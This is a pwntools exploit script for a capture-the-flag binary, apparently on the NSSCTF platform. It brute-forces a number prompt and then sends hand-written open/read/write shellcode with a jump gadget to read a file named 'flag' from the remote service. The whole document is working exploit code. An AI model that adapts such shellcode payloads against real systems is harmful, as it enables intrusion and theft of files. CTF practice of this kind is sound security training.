from pwn import *
import sys
from ctypes import *
remote_addr = ["node6.anna.nssctf.cn",28148]
#libc = ELF('')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./RANDOM")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

for i in range(100):
    ru(b'num:\n')
    sl(b'1')
    st = rl()
    if b'guys' in st:
        break
    
debug('b *0x400942')
ru(b'door\n')
gad_jm = 0x40094a
sc3 = '''
    sub rsp, 0x100
    jmp $-55
'''

open_sc = '''
    push 0x67616c66
    mov rdi, rsp
    syscall
'''

read_sc = '''
    mov rdi, rax
    xor eax, eax
    mov dh, 0x100 >> 8
    mov rsi, rsp
    syscall
'''

write_sc = '''
    mov al, 1
    mov dil, 1
    mov dh, 0x100 >> 8
    syscall
'''

slices = '''
    push 2
    pop rax
    xor esi, esi
    xor edx, edx
'''

pause()

payload = asm(open_sc) + asm(read_sc) + asm(write_sc)
payload = payload.ljust(31, b'\x90') + asm(slices).rjust(9, b'\x90') + p64(gad_jm)
payload += asm(sc3)
sl(payload)


shell()
